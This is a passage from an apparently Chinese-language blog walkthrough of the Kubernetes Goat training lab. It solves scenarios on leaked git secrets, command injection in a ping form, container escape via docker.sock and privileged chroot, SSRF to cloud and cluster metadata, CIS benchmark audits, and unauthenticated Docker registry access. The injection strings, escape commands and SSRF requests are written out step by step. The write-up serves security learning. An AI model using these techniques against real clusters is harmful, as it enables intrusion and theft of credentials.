&lt;madhu.akula@hotmail.com&gt;</span><br><span class="line">Date:   Fri Nov 6 23:42:28 2020 +0100</span><br><span class="line"></span><br><span class="line">    Final release</span><br><span class="line"></span><br><span class="line">commit 3292ff3bd8d96f192a9d4eb665fdd1014d87d3df</span><br><span class="line">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line">Date:   Fri Nov 6 23:40:59 2020 +0100</span><br><span class="line"></span><br><span class="line">    Updated the docs</span><br><span class="line"></span><br><span class="line">commit 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line">Date:   Fri Nov 6 23:39:21 2020 +0100</span><br><span class="line"></span><br><span class="line">    updated the endpoints and routes</span><br><span class="line"></span><br><span class="line">commit d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line">Date:   Fri Nov 6 23:31:06 2020 +0100</span><br><span class="line"></span><br><span class="line">    Inlcuded custom environmental variables</span><br><span class="line"></span><br><span class="line">commit bb2967a6f26fb59bf64031bbb14b4f3e233944ca</span><br><span class="line">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line">Date:   Fri Nov 6 23:28:33 2020 +0100</span><br><span class="line"></span><br><span class="line">    Added ping endpoint</span><br></pre></td></tr></table></figure>
+
+<p>用这个commit的ID checkout进去：<code>git checkout d7c173ad183c574109cd5c4c648ffe551755b576</code></p>
+<p>再查看这里面的环境变量内容：<code>ls -al</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240807223337067.png" alt="image-20240807223337067"></p>
+<p>确实存在一个.env文件，<code>cat</code>一下，得到敏感信息，包括硬编码的AWS密钥以及flag：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240807223457158.png" alt="image-20240807223457158"></p>
+<p>done</p>
+<h3 id="1-2-2-Method-2（访问pod，白盒）"><a href="#1-2-2-Method-2（访问pod，白盒）" class="headerlink" title="1.2.2 Method 2（访问pod，白盒）"></a>1.2.2 Method 2（访问pod，白盒）</h3><p>模仿有了pod的shell交互权限</p>
+<p>首先进到这个pod的shell（注意提取这个pod名称的路径）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=build-code&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span><br><span class="line">kubectl <span class="built_in">exec</span> -it <span class="variable">$POD_NAME</span> -- sh</span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以手工分析或者使用自动化工具（如<a target="_blank" rel="noopener" href="https://github.com/trufflesecurity/trufflehog">TruffleHog</a>）分析代码库里面可能存在的敏感信息</p>
+<p>下面的场景是，这个pod容器里面已经自带了TruffleHog工具，直接跑起来进行自动化检查</p>
+<p>执行：<code>trufflehog .</code></p>
+<p>可以检查出不同commit可能包含的敏感信息，例如我们的目标flag：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240807224358110.png" alt="image-20240807224358110"></p>
+<p>done</p>
+<h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3 总结"></a>1.3 总结</h2><p>路径：</p>
+<ul>
+<li>git的话，代码库文件夹是<code>.git</code>，里面包含配置文件<code>config</code></li>
+<li><code>.env</code>等环境变量配置文件里面，可能存在敏感信息</li>
+</ul>
+<p>工具：</p>
+<ul>
+<li>目录爆破工具：Gobuster、DirBuster</li>
+<li>git拖库工具：git-dumper（python3脚本）</li>
+<li>代码库敏感信息检查工具：TruffleHog</li>
+</ul>
+<p>命令：</p>
+<ul>
+<li>查看git日志以及提交记录：<code>git log</code></li>
+<li>切换到指定的commit：<code>git checkout &lt;commit ID&gt;</code></li>
+</ul>
+<h1 id="2-DIND-docker-in-docker-exploitation"><a href="#2-DIND-docker-in-docker-exploitation" class="headerlink" title="2 DIND (docker-in-docker) exploitation"></a>2 DIND (docker-in-docker) exploitation</h1><h2 id="2-1-Overview"><a href="#2-1-Overview" class="headerlink" title="2.1 Overview"></a>2.1 Overview</h2><p>此场景旨在关注如何构建利用容器套接字从底层容器运行时创建、构建和运行容器的系统和管道的常见和标准方法。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-2-29ce411f882ff11438dfdd96b7fa45fd.png" alt="scenario-2-29ce411f882ff11438dfdd96b7fa45fd"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何测试和利用容器UNIX套接字的错误配置</li>
+<li>能够利用容器并逃离docker容器</li>
+<li>了解管道和CI&#x2F;CD构建系统中常见的错误配置</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>大多数CI&#x2F;CD和管道系统使用底层主机Docker运行时，通过使用名为DIND（Docker in Docker）的东西和UNIX套接字，在管道中为您构建容器。在这种情况下，我们试图利用这种配置错误，通过逃离docker容器来访问主机系统。</p>
+<p><strong>目标</strong></p>
+<ul>
+<li>从正在运行的docker容器中逃逸到容器正在运行的主机系统，并能够访问主机系统并在其上执行操作。</li>
+</ul>
+<h2 id="2-2-Solution-Walkthrough"><a href="#2-2-Solution-Walkthrough" class="headerlink" title="2.2 Solution &amp; Walkthrough"></a>2.2 Solution &amp; Walkthrough</h2><h3 id="2-2-1-Method-1"><a href="#2-2-1-Method-1" class="headerlink" title="2.2.1 Method 1"></a>2.2.1 Method 1</h3><p>进去之后，发现是一个ping功能</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808192104821.png" alt="image-20240808192104821"></p>
+<p>直接想到常见的命令执行漏洞</p>
+<p>输入“127.0.0.1;whoami”，回车，发现回显的末尾多了用户名称“root”</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808192301106.png" alt="image-20240808192301106"></p>
+<p>下面就是考虑怎么利用这个命令执行漏洞去利用可能存在的容器套接字</p>
+<p>首先查看mount信息，是为了获取可能的<strong>容器文件系统绝对路径</strong>、<strong>docker.sock路径</strong></p>
+<p>输入“;mount”，回车，发现大有收获：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808192905784.png" alt="image-20240808192905784"></p>
+<p>知道了容器文件系统的绝对路径，也知道了有docker.sock存在</p>
+<p>下面尝试能不能直接利用这个docker.sock，这个套接字说不定是直接从宿主机那挂载进来的</p>
+<p>与docker.sock通信可以有多种方法</p>
+<ul>
+<li>使用Docker官方的二进制程序</li>
+<li>使用<code>curl</code></li>
+</ul>
+<p>下面尝试用Docker官方程序</p>
+<p>输入“;uname -a”查看目标系统架构，以便下载版本正确的程序，回显：“Linux health-check-deployment-678f7cc6fb-bg4lv 5.10.207 #1 SMP Thu May 9 02:07:35 UTC 2024 x86_64 GNU&#x2F;Linux”，得到目标系统版本是x86_64架构的Linux</p>
+<p>输入“;wget <a target="_blank" rel="noopener" href="https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz">https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz</a> -O &#x2F;tmp&#x2F;docker-19.03.9.tgz”，从而下载对应的docker程序</p>
+<p>输入“;tar -xvzf &#x2F;tmp&#x2F;docker-19.03.9.tgz -C &#x2F;tmp&#x2F;”，解压出来</p>
+<p>之后就可以通过各种docker命令操作宿主机系统</p>
+<p>比如查看所有镜像：“;&#x2F;tmp&#x2F;docker&#x2F;docker -H unix:&#x2F;&#x2F;&#x2F;custom&#x2F;docker&#x2F;docker.sock images”</p>
+<p>或者进一步创建超级权限的容器，挂载宿主机文件系统，干坏事</p>
+<p>done</p>
+<h2 id="2-3-总结"><a href="#2-3-总结" class="headerlink" title="2.3 总结"></a>2.3 总结</h2><p>命令：</p>
+<ul>
+<li>查看目标系统架构：<code>uname -a</code></li>
+<li>下载对应的docker程序：<code>wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz</code></li>
+</ul>
+<h1 id="3-SSRF-in-the-Kubernetes-K8S-world"><a href="#3-SSRF-in-the-Kubernetes-K8S-world" class="headerlink" title="3 SSRF in the Kubernetes (K8S) world"></a>3 SSRF in the Kubernetes (K8S) world</h1><h2 id="3-1-Overview"><a href="#3-1-Overview" class="headerlink" title="3.1 Overview"></a>3.1 Overview</h2><p>此场景旨在展示在云环境中无处不在的流行应用程序安全漏洞。现在，我们将尝试了解它对Kubernetes集群、内部服务和微服务的影响。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-3-9d249af6ea439565f61ff69fffb033ee.png" alt="scenario-3-9d249af6ea439565f61ff69fffb033ee"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何利用云环境中应用程序中的SSRF漏洞</li>
+<li>了解元数据查询功能，以访问云提供商数据</li>
+<li>了解并利用Kubernetes本机服务发现功能和DNS查询服务</li>
+<li>访问集群环境中的内部微服务</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>SSRF（服务器端请求伪造）漏洞成为云原生环境的首选攻击。在这种情况下，我们将看到如何利用SSRF等应用程序漏洞来访问云实例元数据以及内部服务元数据信息。特别是，我们看到了Kubernetes中本机功能的强大功能，如服务发现，可以利用和访问其他内部微服务访问。</p>
+<p><strong>目标</strong></p>
+<p>在元数据secrets中获取<code>k8s-goat-FLAG</code></p>
+<h2 id="3-2-Solution-Walkthrough"><a href="#3-2-Solution-Walkthrough" class="headerlink" title="3.2 Solution &amp; Walkthrough"></a>3.2 Solution &amp; Walkthrough</h2><h3 id="3-2-1-Method-1"><a href="#3-2-1-Method-1" class="headerlink" title="3.2.1 Method 1"></a>3.2.1 Method 1</h3><p>访问站点，发现是一个内部API的访问代理：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808212259044.png" alt="image-20240808212259044"></p>
+<p>需要结合特定云提供商&#x2F;平台提供的元数据API或其他内部服务的获取接口，例如：</p>
+<ul>
+<li>AWS有“<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/%E2%80%9D">http://169.254.169.254/latest/meta-data/”</a></li>
+<li>K8S内部服务有“servicename.namespace.svc.cluster.local”</li>
+</ul>
+<blockquote>
+<p><strong>169.254.169.254</strong>是动态配置的IPv4链路本地地址。它仅在单个网段上有效，不能路由。大多数云提供商使用此地址为实例提供计算元数据，包括AWS、GCP Azure、Digital Ocean等主要提供商。</p>
+<p>还需要确定服务正在使用哪个云提供商来运行此计算，以便我们可以使用特定的标头和查询。如果这不是托管在云提供商中，那么我们可以跳过这一步，像Kubernetes集群中的其他微服务和内部服务一样，转向内部服务查询。</p>
+</blockquote>
+<p>配合探测和枚举，可以了解当前实例或其他网络中正在运行的服务</p>
+<p>还可以通过输入不同的地址和端口去询问当前的容器&#x2F;pod，来检查是否存在其他正在运行的服务</p>
+<p>比如，向<a href="http://127.0.0.1:5000发送一个GET请求，发现进一步能够查询的地址是http://metadata-db">http://127.0.0.1:5000发送一个GET请求，发现进一步能够查询的地址是http://metadata-db</a></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808213849640.png" alt="image-20240808213849640"></p>
+<p>输入端点“<a href="http://metadata-db”，发送GET查询，返回HTML内容：">http://metadata-db”，发送GET查询，返回HTML内容：</a></p>
+<p><code>&lt;pre&gt;\n&lt;a href=\&quot;1.0\&quot;&gt;1.0&lt;/a&gt;\n&lt;a href=\&quot;latest/\&quot;&gt;latest/&lt;/a&gt;\n&lt;/pre&gt;\n</code></p>
+<p>说明内部有一个Web站点，地址是<a target="_blank" rel="noopener" href="http://metadata-db,内容如上/">http://metadata-db，内容如上</a></p>
+<p>有两个超链接，分别为“1.0”以及“latest”</p>
+<p>于是进一步GET查询“<a target="_blank" rel="noopener" href="http://metadata-db/latest/%E2%80%9D%EF%BC%8C%E8%BF%94%E5%9B%9E%EF%BC%9A">http://metadata-db/latest/”，返回：</a></p>
+<p><code>&lt;pre&gt;\n&lt;a href=\&quot;events/\&quot;&gt;events/&lt;/a&gt;\n&lt;a  href=\&quot;hostname\&quot;&gt;hostname&lt;/a&gt;\n&lt;a  href=\&quot;latest\&quot;&gt;latest&lt;/a&gt;\n&lt;a  href=\&quot;profile\&quot;&gt;profile&lt;/a&gt;\n&lt;a  href=\&quot;secrets/\&quot;&gt;secrets/&lt;/a&gt;\n&lt;/pre&gt;\n</code></p>
+<p>以此类推可以一步步探测整个Web站点可以访问到的内容</p>
+<p>GET查询到“<a target="_blank" rel="noopener" href="http://metadata-db/latest/secrets/kubernetes-goat%E2%80%9D%EF%BC%8C%E8%BF%94%E5%9B%9E%E4%B8%80%E6%AE%B5%E5%85%83%E6%95%B0%E6%8D%AE%EF%BC%9A">http://metadata-db/latest/secrets/kubernetes-goat”，返回一段元数据：</a></p>
+<p><code>&quot;&#123;\&quot;metadata\&quot;: \&quot;static-metadata\&quot;, \&quot;data\&quot;: \&quot;azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=\&quot;&#125;\n&quot;</code></p>
+<p>base64解码，发现是flag：“k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab”</p>
+<p>done</p>
+<h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><p>路径：</p>
+<ul>
+<li>可能的元数据查询端口：5000</li>
+<li>AWS等云提供商常用的提供元数据查询的API路径：<a target="_blank" rel="noopener" href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a></li>
+<li>K8S常用的元数据查询路径：<a target="_blank" rel="noopener" href="http://metadata-db/">http://metadata-db</a></li>
+</ul>
+<h1 id="4-Container-escape-to-the-host-system"><a href="#4-Container-escape-to-the-host-system" class="headerlink" title="4 Container escape to the host system"></a>4 Container escape to the host system</h1><h2 id="4-1-Overview"><a href="#4-1-Overview" class="headerlink" title="4.1 Overview"></a>4.1 Overview</h2><p>此场景展示了Kubernetes、容器环境和一般安全世界中常见的配置错误和易出错的安全问题之一。给予事情不需要的特权总是会使安全性变得更加糟糕。在容器和Kubernetes领域尤其如此。您还可以根据集群环境和资源的配置和设置，将此场景进一步应用于容器之外的其他系统和服务。在这种情况下，您将看到一个特权容器逃逸以访问主机系统。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-4-8365f1150e410a08e1ed2e204267dbc9.png" alt="scenario-4-8365f1150e410a08e1ed2e204267dbc9"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>能够利用容器并实现docker容器逃逸</li>
+<li>学习测试和利用配置错误和特权容器</li>
+<li>了解容器、Kubernetes和集群化环境中常见的配置错误及其可能造成的损害</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>大多数监控、跟踪和调试软件都需要以额外的权限和功能运行。在这种情况下，我们将看到一个具有额外功能和特权的pod，包括HostPath，它允许我们访问主机系统并提供节点级配置，以实现完全的集群控制。</p>
+<p><strong>目标</strong></p>
+<ul>
+<li>使用可用的错误配置在主机系统上正在运行的docker容器中实现逃逸</li>
+<li>使用主机系统级访问权限来获得其他资源访问权限，如果可能的话，甚至可以获得容器、节点和集群级访问权限</li>
+</ul>
+<h2 id="4-2-Solution-Walkthrough"><a href="#4-2-Solution-Walkthrough" class="headerlink" title="4.2 Solution &amp; Walkthrough"></a>4.2 Solution &amp; Walkthrough</h2><h3 id="4-2-1-Method-1"><a href="#4-2-1-Method-1" class="headerlink" title="4.2.1 Method 1"></a>4.2.1 Method 1</h3><p>访问站点，发现给了一个虚拟终端，可以执行命令</p>
+<p>确认这个虚拟终端是否在容器环境，多种方式，比如这里简单执行<code>ps</code>命令，查看进程列表是否过于简洁：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808220511722.png" alt="image-20240808220511722"></p>
+<p>又或者查看根目录下是否有.dockerenv文件：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808220557559.png" alt="image-20240808220557559"></p>
+<p>接着检查这个容器的CAP能力：<code>capsh --print</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808220716447.png" alt="image-20240808220716447"></p>
+<p>发现已经拉满了，也就是说这是个特权容器，可以为所欲为</p>
+<p><code>mount</code>查看挂载情况，发现很多都涉及到<code>/host-system</code>这个路径，从名字上看，这个特权容器可能已经为我们安排好了宿主机文件系统（乐）</p>
+<p>查看一下这个路径，发现确实像宿主机的文件系统：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808221005997.png" alt="image-20240808221005997"></p>
+<p>确定之后，可以使用<code>chroot</code>切换到宿主机环境：<code>chroot /host-system bash</code></p>
+<p>再执行<code>docker</code>，发现已经可以使用docker命令，这是在原来的容器shell下没有的</p>
+<p>也就是说，现在已经获取了宿主机的shell，用户为root</p>
+<blockquote>
+<p>Kubernetes节点配置可以在默认路径中找到，节点级kubelet使用该路径与Kubernetes API Server对话。如果您可以使用此配置，您将获得与Kubernetes节点相同的权限。</p>
+</blockquote>
+<p>尝试查看K8S的节点级配置路径：<code>ls -lh /var/lib/kubelet</code></p>
+<p>但是这里没有我想要的kubeconfig文件，而且<code>kubectl</code>命令也是显示不存在的</p>
+<p>找找在哪，<code>find /var/lib/ -name kubeconfig</code>，回显这个：&#x2F;var&#x2F;lib&#x2F;minikube&#x2F;kubeconfig</p>
+<p>才意识到我是用minikube搭建的K8S环境，因此和常规搭建的K8S环境有点区别</p>
+<p>找到kubectl的路径为：&#x2F;mnt&#x2F;vda1&#x2F;var&#x2F;lib&#x2F;minikube&#x2F;binaries&#x2F;v1.30.0&#x2F;kubectl</p>
+<p>下面又有问题了，<code>cd</code>到kubectl的路径之后：</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240808223442887.png" alt="image-20240808223442887"></p>
+<p>显示和K8S API Server通信的地址，有问题</p>
+<p>可能minikube的架构，有点特别</p>
+<p>反正就是，找到了能用的kubeconfig，就能用kubectl操纵整个集群</p>
+<p>于是undone</p>
+<h2 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a>4.3 总结</h2><p>路径：</p>
+<ul>
+<li>K8S集群默认的配置路径：<code>/var/lib/kubelet/kubeconfig</code></li>
+</ul>
+<p>命令：</p>
+<ul>
+<li>查看当前环境的CAP能力：<code>capsh --print</code></li>
+<li>找到了在容器内挂载的宿主机文件系统的话，切换到宿主机环境：<code>chroot &lt;host fs path&gt; bash</code></li>
+</ul>
+<h1 id="5-Docker-CIS-benchmarks-analysis"><a href="#5-Docker-CIS-benchmarks-analysis" class="headerlink" title="5 Docker CIS benchmarks analysis"></a>5 Docker CIS benchmarks analysis</h1><h2 id="5-1-Overview"><a href="#5-1-Overview" class="headerlink" title="5.1 Overview"></a>5.1 Overview</h2><p>此场景在执行容器安全审计和评估时非常有用。在这里，我们将学习对docker容器流行的CIS基准审计，并将结果用于进一步利用或修复配置错误和漏洞。如果你来自现代容器和云原生生态系统的审计和合规背景，这一点非常重要。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-5-bdef8a5cad9f733a492c4ad24c2f42f4.png" alt="scenario-5-bdef8a5cad9f733a492c4ad24c2f42f4"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>对Docker容器执行CIS基准审核</li>
+<li>使用Daemonset、Kubernetes中的Pod和集群中的其他资源</li>
+<li>了解整个容器安全态势并了解风险</li>
+</ul>
+<p><strong>背景</strong></p>
+<blockquote>
+<p>DaemonSet确保所有（或部分）节点运行Pod的副本。随着节点被添加到集群中，Pod也被添加到其中。当节点从集群中删除时，这些Pod会被垃圾回收。删除DaemonSet将清理它创建的Pod。</p>
+<p>DaemonSet的一些典型用途是：</p>
+<ul>
+<li>在每个节点上运行群集存储守护进程</li>
+<li>在每个节点上运行日志收集守护进程</li>
+<li>在每个节点上运行节点监视守护进程</li>
+</ul>
+</blockquote>
+<p>此场景主要是在Kubernetes节点上执行Docker CIS基准测试分析，以识别可能的安全漏洞。</p>
+<p>要开始使用此场景，您可以访问节点并按照docker bench security执行，也可以运行以下命令将docker bench security部署为Kubernetes集群中的DaemonSet</p>
+<p>要开始使用该场景，您可以使用以下命令部署Docker CIS基准DaemonSet：</p>
+<p><code>kubectl apply -f scenarios/docker-bench-security/deployment.yaml</code></p>
+<p>要执行到pod中，我们可以运行以下命令。确保替换pod名称:</p>
+<p><code>kubectl exec -it docker-bench-security-xxxxx -- sh</code></p>
+<p><strong>目标</strong></p>
+<p>执行Docker CIS基准审核并获取审核结果。</p>
+<blockquote>
+<p>关于Docker Bench for Security：<a target="_blank" rel="noopener" href="https://github.com/docker/docker-bench-security">https://github.com/docker/docker-bench-security</a></p>
+</blockquote>
+<h2 id="5-2-Solution-Walkthrough"><a href="#5-2-Solution-Walkthrough" class="headerlink" title="5.2 Solution &amp; Walkthrough"></a>5.2 Solution &amp; Walkthrough</h2><h3 id="5-2-1-Method-1"><a href="#5-2-1-Method-1" class="headerlink" title="5.2.1 Method 1"></a>5.2.1 Method 1</h3><p>直接运行：<code>kubectl apply -f scenarios/docker-bench-security/deployment.yaml</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240809211309102.png" alt="image-20240809211309102"></p>
+<p>然后通过运行<code>kubectl get pods</code>列出DaemonSet中正在运行的Pod，多了一个docker-bench-security-xxxxx</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240809214309037.png" alt="image-20240809214309037"></p>
+<p>之后进入到这个pod的shell：<code>kubectl exec -it docker-bench-security-c4g92 -- sh</code></p>
+<p>docker-bench-security已经预装在里面了，直接cd到对应目录并执行docker-bench-security.sh</p>
+<p>然后就会自动执行安全基准检查，列出一大堆安全警示，最好输出到文件中方便查看</p>
+<h2 id="5-3-总结"><a href="#5-3-总结" class="headerlink" title="5.3 总结"></a>5.3 总结</h2><p>工具：</p>
+<ul>
+<li>Docker容器安全基准检查工具：docker-bench-security</li>
+</ul>
+<h1 id="6-Kubernetes-CIS-benchmarks-analysis"><a href="#6-Kubernetes-CIS-benchmarks-analysis" class="headerlink" title="6 Kubernetes CIS benchmarks analysis"></a>6 Kubernetes CIS benchmarks analysis</h1><h2 id="6-1-Overview"><a href="#6-1-Overview" class="headerlink" title="6.1 Overview"></a>6.1 Overview</h2><p>此场景在执行Kubernetes安全审计和评估时非常有用。在这里，我们将学习为Kubernetes集群运行流行的CIS基准审计，并将结果用于进一步利用或修复配置错误和漏洞。如果你来自现代容器、Kubernetes和云原生生态系统的审计和合规背景，这一点非常重要，也是必须的。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-6-78049d3b97fcd61c8101b10ea4bd0e8b.png" alt="scenario-6-78049d3b97fcd61c8101b10ea4bd0e8b"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>学习为Kubernetes集群执行CIS基准审核</li>
+<li>使用Kubernetes中的jobs、Pods和集群中的其他资源</li>
+<li>了解整个Kubernetes集群的安全态势并了解风险</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>此场景主要是在Kubernetes节点和集群资源之上执行Kubernetes CIS基准测试分析，以识别可能的安全漏洞。</p>
+<p>要开始使用此场景，您可以访问节点并按照kube-bench security执行，也可以运行以下命令将kube-bench部署为Kubernetes job：</p>
+<p><code>kubectl apply -f scenarios/kube-bench-security/node-job.yaml</code></p>
+<p><code>kubectl apply -f scenarios/kube-bench-security/master-job.yaml</code></p>
+<p><strong>目标</strong></p>
+<p>执行Kubernetes CIS基准审核并获得审核结果。</p>
+<blockquote>
+<p>Job会创建一个或多个Pod，并将继续重试Pod的执行，直到指定数量的Pod成功终止。当Pod成功完成时，Job会跟踪成功完成的情况。当达到指定的成功完成次数时，任务（即Job）完成。删除Job将清理它创建的Pod。暂停作业将删除其活动的Pod，直到Job再次恢复。</p>
+</blockquote>
+<h2 id="6-2-Solution-Walkthrough"><a href="#6-2-Solution-Walkthrough" class="headerlink" title="6.2 Solution &amp; Walkthrough"></a>6.2 Solution &amp; Walkthrough</h2><h3 id="6-2-1-Method-1"><a href="#6-2-1-Method-1" class="headerlink" title="6.2.1 Method 1"></a>6.2.1 Method 1</h3><p>直接执行：<code>kubectl apply -f scenarios/kube-bench-security/node-job.yaml</code></p>
+<p>之后K8S安全基准测试将会开启</p>
+<p>通过<code>kubectl get jobs</code>以及<code>kubectl get pods</code>来获取相关情况</p>
+<p>一旦我们识别出pod，我们就可以通过运行以下命令来获取审计结果。确保在以下命令中替换pod名称：</p>
+<p><code>kubectl logs -f kube-bench-node-xxxxx</code></p>
+<p>总体来说和上一个场景差不多</p>
+<h2 id="6-3-总结"><a href="#6-3-总结" class="headerlink" title="6.3 总结"></a>6.3 总结</h2><p>工具：</p>
+<ul>
+<li>K8S安全基准检查工具：kube-bench</li>
+</ul>
+<h1 id="7-Attacking-private-registry"><a href="#7-Attacking-private-registry" class="headerlink" title="7 Attacking private registry"></a>7 Attacking private registry</h1><h2 id="7-1-Overview"><a href="#7-1-Overview" class="headerlink" title="7.1 Overview"></a>7.1 Overview</h2><p>在该场景下，我们将看到Docker容器私有注册表的一个错误配置，以及我们如何获取和访问镜像及其内容。在容器的早期，有一个流行的黑客攻击，vine（现被推特收购）被黑客攻击，由于这个简单的配置错误，产品的整个源代码都被泄露了。此外，即使在今天，我们也看到了大量类似的情况，但也有经过身份验证的注册表以及配置错误的权限和特权。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-7-fbcf2b81257e7185ddfa569b9089e34d.png" alt="scenario-7-fbcf2b81257e7185ddfa569b9089e34d"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何与Docker容器注册表API交互</li>
+<li>能够检视容器注册表API、容器镜像和manifests</li>
+<li>了解容器元数据如何存储并与层交互</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>容器注册表是推送所有容器镜像的地方。大多数时候，每个组织都有自己的私有注册表。有时它最终会配置错误，public&#x2F;open。另一方面，开发人员假设他们的内部私有注册表仅用于内部，并最终将所有敏感信息存储在容器镜像中。</p>
+<blockquote>
+<p>Registry是一个无状态、高度可扩展的服务器端应用程序，它存储并允许您使用HTTP  API分发Docker映像。早期版本的docker注册表api（即v1）存在一些问题，因此v2发布并大大提高了安全性。然而，需要注意的是，默认情况下，Docker Registry的两个版本都没有启用身份验证。</p>
+</blockquote>
+<p><strong>目标</strong></p>
+<p>在私有注册表镜像中获取k8s-goat-FLAG flag。</p>
+<h2 id="7-2-Solution-Walkthrough"><a href="#7-2-Solution-Walkthrough" class="headerlink" title="7.2 Solution &amp; Walkthrough"></a>7.2 Solution &amp; Walkthrough</h2><h3 id="7-2-1-Method-1"><a href="#7-2-1-Method-1" class="headerlink" title="7.2.1 Method 1"></a>7.2.1 Method 1</h3><p>直接访问目标站点，只显示一片空白</p>
+<p>要结合Docker容器注册表的API进行REST API请求发送</p>
+<p>现实情况中首先要进行探测，才知道目标的1235端口运行着Docker容器私有注册表服务</p>
+<p>之后</p>
+<p>查询注册表API v2：<code>curl http://10.10.10.142:1235/v2/</code></p>
+<p>返回”{}“，则说明是v2版本的API</p>
+<p>查询注册表中可用镜像的所有信息：<code>curl http://10.10.10.142:1235/v2/_catalog</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240811213148871.png" alt="image-20240811213148871"></p>
+<p>根据上面返回的镜像信息，进一步构造查询语句，进行镜像manifest信息查询：<code>curl http://10.10.10.142:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest</code></p>
+<p>返回一大段信息，可以通过<code>grep -i env</code>查询与环境变量有关的数据：<code>curl http://10.10.10.142:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest | grep -i env</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240811213710096.png" alt="image-20240811213710096"></p>
+<p>可以看到有我们需要的flag</p>
+<p>更进一步，可以通过Docker客户端程序把整个镜像下载下来进一步分析，寻找有没有敏感文件或信息</p>
+<p>某些情况下还可以根据特权信息将镜像push到注册表进行注册表污染</p>
+<p>主要就是一个Docker注册表未授权访问的漏洞</p>
+<p>done</p>
+<h2 id="7-3-总结"><a href="#7-3-总结" class="headerlink" title="7.3 总结"></a>7.3 总结</h2><p>路径：</p>
+<ul>
+<li>探测注册表API版本：<a target="_blank" rel="noopener" href="http://10.10.10.142:1235/v2/">http://10.10.10.142:1235/v2/</a></li>
+<li>探测注册表镜像信息：<a target="_blank" rel="noopener" href="http://10.10.10.142:1235/v2/_catalog">http://10.10.10.142:1235/v2/_catalog</a></li>
+<li>探测具体镜像的manifest信息：<a target="_blank" rel="noopener" href="http://10.10.10.142:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest">http://10.10.10.142:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest</a></li>
+</ul>
